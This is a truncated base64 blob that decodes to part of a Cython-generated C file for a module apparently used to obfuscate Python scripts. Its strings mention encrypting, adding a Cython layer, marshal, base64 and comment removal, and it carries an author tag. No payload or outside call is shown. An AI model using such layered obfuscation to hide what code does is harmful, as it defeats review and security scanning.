D09IDJcbiAgICAjZGVmaW5lIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWCAiYW1zZW5kYmFja3BvcnQiXG4jZWxzZVxuICAgICNkZWZpbmUgX19QWVhfQU1fU0VORF9BQklfU1VGRklYICJub2Ftc2VuZCJcbiNlbmRpZlxuI2lmbmRlZiBfX1BZWF9NT05JVE9SSU5HX0FCSV9TVUZGSVhcbiAgICAjZGVmaW5lIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWFxuI2VuZGlmXG4jaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAgICNkZWZpbmUgX19QWVhfVFBfRklOQUxJWkVfQUJJX1NVRkZJWFxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUFlYX1RQX0ZJTkFMSVpFX0FCSV9TVUZGSVggIm5vZmluYWxpemUiXG4jZW5kaWZcbiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUyB8fCAhZGVmaW5lZChfX1B5eF9Bc3luY0dlbl9VU0VEKVxuICAgICNkZWZpbmUgX19QWVhfRlJFRUxJU1RTX0FCSV9TVUZGSVhcbiNlbHNlXG4gICAgI2RlZmluZSBfX1BZWF9GUkVFTElTVFNfQUJJX1NVRkZJWCAibm9mcmVlbGlzdHMiXG4jZW5kaWZcbiNkZWZpbmUgQ1lUSE9OX0FCSSAgX19QWVhfQUJJX1ZFUlNJT04gX19QWVhfTElNSVRFRF9BQklfU1VGRklYIF9fUFlYX01PTklUT1JJTkdfQUJJX1NVRkZJWCBfX1BZWF9UUF9GSU5BTElaRV9BQklfU1VGRklYIF9fUFlYX0ZSRUVMSVNUU19BQklfU1VGRklYIF9fUFlYX0FNX1NFTkRfQUJJX1NVRkZJWFxuI2RlZmluZSBfX1BZWF9BQklfTU9EVUxFX05BTUUgIl9jeXRob25fIiBDWVRIT05fQUJJXG4jZGVmaW5lIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCBfX1BZWF9BQklfTU9EVUxFX05BTUUgIi4iXG5cblxuXG5cblxuI2RlZmluZSBfX1B5eF9NT0RVTEVfTkFNRSAibnEiXG5leHRlcm4gaW50IF9fcHl4X21vZHVsZV9pc19tYWluX25xO1xuaW50IF9fcHl4X21vZHVsZV9pc19tYWluX25xID0gMDtcblxuXG5cbnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9yYW5nZTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfYnVpbHRpbl9vcGVuO1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX3ByaW50O1xuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9idWlsdGluX2V4aXQ7XG5cbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfW10gPSAiIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYVtdID0gIlxcMjIwYSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NbXSA9ICIuYyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2ZbXSA9ICJmIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ1tdID0gImciO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pW10gPSAiaSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21bXSA9ICJtLyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JbXSA9ICJyIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd1tdID0gInciO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18wbVtdID0gIlxcMDMzWzBtIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzJbXSA9ICIiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNFtdID0gIi4iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNVtdID0gIj8iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNltdID0gIl8iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fN1tdID0gIlxcMjQwXFwwMDEiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hYVtdID0gImFhIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2NbXSA9ICJnYyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2d3W10gPSAiZ3ciO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ucVtdID0gIm5xIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3NbXSA9ICJvcyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3B5W10gPSAiLnB5IjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYV8yW10gPSAiYSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3BvcFtdID0gInBvcCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2V4aXRbXSA9ICJleGl0IjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZnVuY1tdID0gIl9fZnVuY19fIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbWFpbltdID0gIl9fbWFpbl9fIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmFtZVtdID0gIm5hbWUiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19uZXh0W10gPSAibmV4dCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX29wZW5bXSA9ICJvcGVuIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVhZFtdID0gInJlYWQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZW5kW10gPSAic2VuZCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NwZWNbXSA9ICJfX3NwZWNfXyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Rlc3RbXSA9ICJfX3Rlc3RfXyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NsZWFyW10gPSAiY2xlYXIiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbG9zZVtdID0gImNsb3NlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW50ZXJbXSA9ICJfX2VudGVyX18iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19mQV8yVVtdID0gIlxcMjAwXFwwMDFcXDMzMFxcMDA0XFwwMTZcXDIxMGZcXDIyMEFcXDMzMFxcMDA0XFwwMTNcXDIxMDJcXDIxMFVcXDIyMC5cXDI0MFxcMDAxIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmFtZTJbXSA9ICJuYW1lMiI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3ByaW50W10gPSAicHJpbnQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19yYW5nZVtdID0gInJhbmdlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGhyb3dbXSA9ICJ0aHJvdyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3V0Zl84W10gPSAidXRmLTgiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa192YWx1ZVtdID0gInZhbHVlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd3JpdGVbXSA9ICJ3cml0ZSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFfMlVfYVtdID0gIlxcMzIwXFwwMDBcXDAzM1xcMjMwMVxcMzQwXFwwMDRcXDAyMVxcMjIwXFwwMjZcXDMyMFxcMDI3KFxcMjUwXFwwMDJcXDI1MCZcXDI2MFxcMDAxXFwzMzBcXDAwNFxcMDEzXFwyMTAyXFwyMTBVXFwyMjAkXFwyMjBhIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYmFzZTY0W10gPSAiYmFzZTY0IjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2hvaWNlW10gPSAiY2hvaWNlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGlnaXRzW10gPSAiZGlnaXRzIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW5hYmxlW10gPSAiZW5hYmxlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZXhpdF8yW10gPSAiX19leGl0X18iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19sZW5ndGhbXSA9ICJsZW5ndGgiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tb2R1bGVbXSA9ICJfX21vZHVsZV9fIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmFtZV8yW10gPSAiX19uYW1lX18iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19yYW5kb21bXSA9ICJyYW5kb20iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19yZW1vdmVbXSA9ICJyZW1vdmUiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zaHV0aWxbXSA9ICJzaHV0aWwiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zdHJpbmdbXSA9ICJzdHJpbmciO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zeXN0ZW1bXSA9ICJzeXN0ZW0iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb250ZW50W10gPSAiY29udGVudCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Rpc2FibGVbXSA9ICJkaXNhYmxlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2VuZXhwcltdID0gImdlbmV4cHIiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pbnB1dF9mW10gPSAiaW5wdXRfZiI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2xldHRlcnNbXSA9ICJsZXR0ZXJzIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbV9ucV9weVtdID0gIm0vbnEucHkiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tYXJzaGFsW10gPSAibWFyc2hhbCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JhbmRpbnRbXSA9ICJyYW5kaW50IjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVwbGFjZVtdID0gInJlcGxhY2UiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hdXRvcGVwOFtdID0gImF1dG9wZXA4IjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY3l0aG9uX21bXSA9ICJjeXRob24gbS8iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kYXRldGltZVtdID0gImRhdGV0aW1lIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW5jb2RpbmdbXSA9ICJlbmNvZGluZyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2ZpeF9jb2RlW10gPSAiZml4X2NvZGUiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19vdXRwdXRfZltdID0gIm91dHB1dF9mIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcXVhbG5hbWVbXSA9ICJfX3F1YWxuYW1lX18iO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZXRfbmFtZVtdID0gIl9fc2V0X25hbWVfXyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lzZW5hYmxlZFtdID0gImlzZW5hYmxlZCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NoYXJhY3RlcnNbXSA9ICJjaGFyYWN0ZXJzIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaW5fY29tbWVudFtdID0gImluX2NvbW1lbnQiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pbnB1dF9maWxlW10gPSAiaW5wdXRfZmlsZSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX25hbWUyX2Jhc2VbXSA9ICJuYW1lMl9iYXNlIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3V0cHV0X2ZpbGVbXSA9ICJvdXRwdXRfZmlsZSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2luaXRpYWxpemluZ1tdID0gIl9pbml0aWFsaXppbmciO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pc19jb3JvdXRpbmVbXSA9ICJfaXNfY29yb3V0aW5lIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2xhc3NfZ2V0aXRlbVtdID0gIl9fY2xhc3NfZ2V0aXRlbV9fIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3V0cHV0X2NvbnRlbnRbXSA9ICJvdXRwdXRfY29udGVudCI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FzY2lpX2xvd2VyY2FzZVtdID0gImFzY2lpX2xvd2VyY2FzZSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FzY2lpX3VwcGVyY2FzZVtdID0gImFzY2lpX3VwcGVyY2FzZSI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JlbW92ZV9jb21tZW50c1tdID0gInJlbW92ZV9jb21tZW50cyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2d3X2xvY2Fsc19nZW5leHByW10gPSAiZ3cuPGxvY2Fscz4uZ2VuZXhwciI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FzeW5jaW9fY29yb3V0aW5lc1tdID0gImFzeW5jaW8uY29yb3V0aW5lcyI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2NsaW5lX2luX3RyYWNlYmFja1tdID0gImNsaW5lX2luX3RyYWNlYmFjayI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0ZhaWxlZF9jeXRob25fZXJyb3JbXSA9ICJGYWlsZWQgY3l0aG9uIGVycm9yIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeFtdID0gImdlbmVyYXRlX3JhbmRvbV9zdWZmaXgiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xXzkybV8zOF81XzQ5bUVOQ1JZUFRJTkdbXSA9ICJcXDAzM1sxOzkybVxcMDMzWzM4OzU7NDltRU5DUllQVElORy4uLiEhIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMV85Mm1fMzhfNV80OG1BRERJTkdfQ1lUSE9OX0xBWVtdID0gIlxcMDMzWzE7OTJtXFwwMzNbMzg7NTs0OG1BRERJTkcgQ1lUSE9OIExBWUVSLi4uISEgIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQVJ2VV95X2FfVjFfMV9nUWJfYV9RYl9lODFfYXFfZ1tdID0gIlxcMjAwXFwwMDFcXDMzMFxcMDA0XFwwMTBcXDIxMFxcMDA0XFwyMTBBXFwyMTBSXFwyMTB2XFwyMjBVXFwyMzAlXFwyMzB5XFwyNTBcXDAwMVxcMzMwXFwwMDRcXDAxMFxcMjEwXFwwMDFcXDIxMFxcMDI1XFwyMTBhXFwzMzBcXDAwNFxcMDA1XFwyMDBWXFwyMTAxXFwzNjBcXDAwNlxcMDAwXFwwMDVcXHRcXDIxMFxcMDAxXFwzNDBcXDAzMFxcMDMyXFwyMzAhXFwzNDBcXDAwNFxcdFxcMjEwXFwwMjFcXDIxMCFcXDM2MFxcMDA2XFwwMDBcXDAwNVxcblxcMjEwXFwwMzBcXDIyMFxcMDMxXFwyMzAhXFwyMzAxXFwzMzBcXDAwNFxcMDA2XFwyMDBnXFwyMTBRXFwyMTBiXFwyMjBcXDAwNlxcMjIwYVxcMzMwXFx0XFxyXFwyMTBRXFwyMTBiXFwyMjBcXDAwNlxcMjIwZVxcMjMwOFxcMjQwMVxcMzMwXFwwMTBcXDAyMFxcMjIwXFwwMDZcXDIyMGFcXDIyMHFcXDM0MFxcMDA0XFx0XFwyMTBcXDAyMVxcMjEwIVxcMzMwXFwwMDRcXHRcXDIxMFxcMDIxXFwyMTAhXFwzNjBcXDAwNlxcMDAwXFwwMDVcXDAwN1xcMjAwZ1xcMjEwUVxcMjEwYlxcMjIwXFxyXFwyMzBRXFwzNDBcXDAwNFxcMDE0XFwyMTBEXFwyMjBcXDAxMFxcMjMwXFwwMDFcXDIzMFxcMDI3XFwyNDBcXDAwMVxcMzMwXFx0XFxyXFwyMTBRXFwyMTBiXFwyMjBcXDAwNlxcMjIwZlxcMjMwSFxcMjQwQVxcMzMwXFwwMTBcXDAxM1xcMjEwM1xcMjEwYVxcMjEwcVxcMjIwXFwwMDVcXDIyMFRcXDIzMFxcMDIyXFwyMzAxXFwzMzBcXDAxNFxcMDIxXFwyMjBcXDAyMVxcMjIwIVxcMzMwXFwwMTRcXDAyMFxcMjIwXFwwMDFcXDM0MFxcMDA0XFwwMjNcXDIyMDFcXDIyMEJcXDIyMGZcXDIzMEZcXDI0MFxcIlxcMjQwRlxcMjUwIVxcMzMwXFwwMDRcXDAyMVxcMjIwXFwwMjRcXDIyMFhcXDIzMFFcXDIzMGdcXDI0MFEiO1xuc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19RbF9hX1FfQmNfN18yUWFzX1FfQVJxX0NxXzRxX2dRW10gPSAiXFwyMDBcXDAwMVxcMzMwXFx0XFxyXFwyMTBRXFwyMTBsXFwyMzAoXFwyNDAhXFwzMzBcXDAxMFxcMDIyXFwyMjBcJ1xcMjMwXFwwMjVcXDIzMGFcXDMzMFxcMDA0XFwwMjVcXDIyMFFcXDMzMFxcMDA0XFwwMjFcXDIyMFxcMDIxXFwzMzBcXDAwNFxcMDEwXFwyMTBcXDAwMVxcMzMwXFwwMDRcXG5cXDIxMFxcIlxcMjEwQlxcMjEwY1xcMjIwXFwwMjFcXDIyMCFcXDMzMFxcMDEwXFwwMTNcXDIxMDdcXDIyMCFcXDIyMDJcXDIyMFFcXDIyMGFcXDIyMHNcXDIzMCNcXDIzMFFcXDMzMFxcMDE0XFwwMzFcXDIzMFxcMDIxXFwzMzBcXDAxNFxcMDIxXFwyMjBcXDAyMVxcMzMwXFwwMTRcXHJcXDMzMFxcclxcMDI0XFwyMjBBXFwyMjBSXFwyMjBxXFwyMzBcXDAwMVxcMjMwXFwwMjNcXDIzMENcXDIzMHFcXDMzMFxcMDE0XFwwMzFcXDIzMFxcMDIxXFwzMzBcXDAxNFxcMDIxXFwyMjBcXDAyMVxcMzMwXFwwMTRcXHJcXDMzMFxcMDEwXFwwMTNcXDIxMDRcXDIxMHFcXDMzMFxcMDE0XFwwMzZcXDIzMGdcXDI0MFFcXDI0MGFcXDMzMFxcMDEwXFxyXFwyMTBRXFwzMzBcXHRcXHJcXDIxMFFcXDIxMG1cXDIzMDhcXDI0MDFcXDMzMFxcMDEwXFwwMjBcXDIyMFxcMDA2XFwyMjBhXFwyMjBxIjtcbnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfVEhJU19FTkNPREVfQllfUFJFRVRfQmVhc3RlcmVuMVtdID0gIiMgVEhJUyBFTkNPREUgQlkgI1BSRUVUIHwgQEJlYXN0ZXJlbjFcXG5pbXBvcnQgb3NcXG5vcy5zeXN0ZW0oXCdjbGVhclwnKVxcbiI7XG5zdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2dlbmVyYXRlX3JhbmRvbV9zdWZmaXhfbG9jYWxzX2dlW10gPSAiZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeC48bG9jYWxzPi5nZW5leHByIjtcblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybnFfMjJnZW5lcmF0ZV9yYW5kb21fc3VmZml4X2dlbmV4cHIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xX2dlbmVyYXRlX3JhbmRvbV9zdWZmaXgoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfbGVuZ3RoKTsgXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJucV8yZ3dfZ2VuZXhwcihQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xXzJndyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9sZW5ndGgpOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xXzRyZW1vdmVfY29tbWVudHMoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfaW5wdXRfZmlsZSwgUHlPYmplY3QgKl9fcHl4X3Zfb3V0cHV0X2ZpbGUpOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5xXzZnKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF92X25hbWUpOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyBcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfdHBfbmV3XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndyhQeVR5cGVPYmplY3QgKnQsIFB5T2JqZWN0ICphLCBQeU9iamVjdCAqayk7IFxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlUeXBlT2JqZWN0ICp0LCBQeU9iamVjdCAqYSwgUHlPYmplY3QgKmspOyBcblxuXG5cbiNpZm5kZWYgQ1lUSE9OX1NNQUxMX0NPREVcbiNpZiBkZWZpbmVkKF9fY2xhbmdfXylcbiAgICAjZGVmaW5lIENZVEhPTl9TTUFMTF9DT0RFXG4jZWxpZiBkZWZpbmVkKF9fR05VQ19fKSAmJiAoX19HTlVDX18gPiA0IHx8IChfX0dOVUNfXyA9PSA0ICYmIF9fR05VQ19NSU5PUl9fID49IDMpKVxuICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREUgX19hdHRyaWJ1dGVfXygoY29sZCkpXG4jZWxzZVxuICAgICNkZWZpbmUgQ1lUSE9OX1NNQUxMX0NPREVcbiNlbmRpZlxuI2VuZGlmXG5cbnR5cGVkZWYgc3RydWN0IHtcbiAgUHlPYmplY3QgKl9fcHl4X2Q7XG4gIFB5T2JqZWN0ICpfX3B5eF9iO1xuICBQeU9iamVjdCAqX19weXhfY3l0aG9uX3J1bnRpbWU7XG4gIFB5T2JqZWN0ICpfX3B5eF9lbXB0eV90dXBsZTtcbiAgUHlPYmplY3QgKl9fcHl4X2VtcHR5X2J5dGVzO1xuICBQeU9iamVjdCAqX19weXhfZW1wdHlfdW5pY29kZTtcbiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRFxuICBQeVR5cGVPYmplY3QgKl9fcHl4X0N5RnVuY3Rpb25UeXBlO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRFxuICBQeVR5cGVPYmplY3QgKl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VEXG4gIFB5VHlwZU9iamVjdCAqX19weXhfR2VuZXJhdG9yVHlwZTtcbiAgI2VuZGlmXG4gICNpZmRlZiBfX1B5eF9JdGVyYWJsZUNvcm91dGluZV9VU0VEXG4gIFB5VHlwZU9iamVjdCAqX19weXhfSXRlcmFibGVDb3JvdXRpbmVUeXBlO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lQXdhaXRUeXBlO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VEXG4gIFB5VHlwZU9iamVjdCAqX19weXhfQ29yb3V0aW5lVHlwZTtcbiAgI2VuZGlmXG4gIFB5T2JqZWN0ICpfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHI7XG4gIFB5T2JqZWN0ICpfX3B5eF90eXBlXzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9ndztcbiAgUHlPYmplY3QgKl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG4gIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcjtcbiAgUHlUeXBlT2JqZWN0ICpfX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3c7XG4gIFB5VHlwZU9iamVjdCAqX19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHI7XG4gIF9fUHl4X0NhY2hlZENGdW5jdGlvbiBfX3B5eF91bWV0aG9kX1B5RGljdF9UeXBlX3BvcDtcbiAgUHlPYmplY3QgKl9fcHl4X3R1cGxlWzVdO1xuICBQeU9iamVjdCAqX19weXhfY29kZW9ial90YWJbNl07XG4gIFB5T2JqZWN0ICpfX3B5eF9zdHJpbmdfdGFiWzk0XTtcbiAgUHlPYmplY3QgKl9fcHl4X2ludF8wO1xuICBQeU9iamVjdCAqX19weXhfaW50XzE7XG4gIFB5T2JqZWN0ICpfX3B5eF9pbnRfMjtcbiAgUHlPYmplY3QgKl9fcHl4X2ludF80O1xuICBQeU9iamVjdCAqX19weXhfaW50XzEwO1xuXG5cbiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICpfX3B5eF9mcmVlbGlzdF8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByWzhdO1xuaW50IF9fcHl4X2ZyZWVjb3VudF8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByO1xuI2VuZGlmXG5cbiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cgKl9fcHl4X2ZyZWVsaXN0XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nd1s4XTtcbmludCBfX3B5eF9mcmVlY291bnRfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3O1xuI2VuZGlmXG5cbiNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuc3RydWN0IF9fcHl4X29ial8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfZnJlZWxpc3RfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJbOF07XG5pbnQgX19weXhfZnJlZWNvdW50XzJucV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByO1xuI2VuZGlmXG5cblB5VHlwZU9iamVjdCAqX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlO1xuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5QeU9iamVjdCAqX19QeXhfQ2FjaGVkTWV0aG9kVHlwZTtcbiNlbmRpZlxuXG5cbnN0cnVjdCBfX1B5eF9Db2RlT2JqZWN0Q2FjaGUgX19weXhfY29kZV9jYWNoZTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGU7XG4jZW5kaWZcblxuXG59IF9fcHl4X21zdGF0ZXR5cGU7XG5cbiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuI2lmZGVmIF9fY3BsdXNwbHVzXG5uYW1lc3BhY2Uge1xuZXh0ZXJuIHN0cnVjdCBQeU1vZHVsZURlZiBfX3B5eF9tb2R1bGVkZWY7XG59IFxuI2Vsc2VcbnN0YXRpYyBzdHJ1Y3QgUHlNb2R1bGVEZWYgX19weXhfbW9kdWxlZGVmO1xuI2VuZGlmXG5cbiNkZWZpbmUgX19weXhfbXN0YXRlX2dsb2JhbCAoX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUoX19QeXhfU3RhdGVfRmluZE1vZHVsZSgmX